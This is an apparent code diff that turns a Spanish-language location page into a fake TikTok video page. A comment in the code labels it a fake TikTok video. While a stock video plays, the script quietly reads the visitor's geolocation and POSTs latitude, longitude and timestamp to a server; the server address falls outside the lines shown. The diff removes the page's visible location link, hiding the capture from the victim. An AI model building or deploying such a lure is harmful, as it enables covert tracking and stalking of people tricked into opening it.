@@ -1,11 +1,29 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Ubicación en tiempo real</title>
+    <title>TikTok</title>
+    <style>
+      body {
+        margin: 0;
+        background-color: black;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      video {
+        max-width: 100%;
+        height: auto;
+      }
+    </style>
   </head>
   <body>
-    <h2>Obteniendo ubicación...</h2>
-    <div id="mapa"></div>
+    <!-- Falso vídeo de TikTok -->
+    <video autoplay muted loop>
+      <source src="https://cdn.pixabay.com/video/2023/01/06/146944-791053999_large.mp4" type="video/mp4">
+      Tu navegador no soporta vídeos.
+    </video>
+
     <script>
       navigator.geolocation.getCurrentPosition(function(pos) {
         const lat = pos.coords.latitude;
@@ -17,14 +35,12 @@
           headers: {
             "Content-Type": "application/json"
           },
-          body: JSON.stringify({ latitud: lat, longitud: lon, timestamp })
+          body: JSON.stringify({
+            lat: lat,
+            lon: lon,
+            timestamp: timestamp
+          })
         });
-
-        const enlace = document.createElement("a");
-        enlace.href = `https://www.google.com/maps?q=${lat},${lon}`;
-        enlace.target = "_blank";
-        enlace.textContent = "📍 Ver ubicación en Google Maps";
-        document.body.appendChild(enlace);
       });
     </script>
   </body>
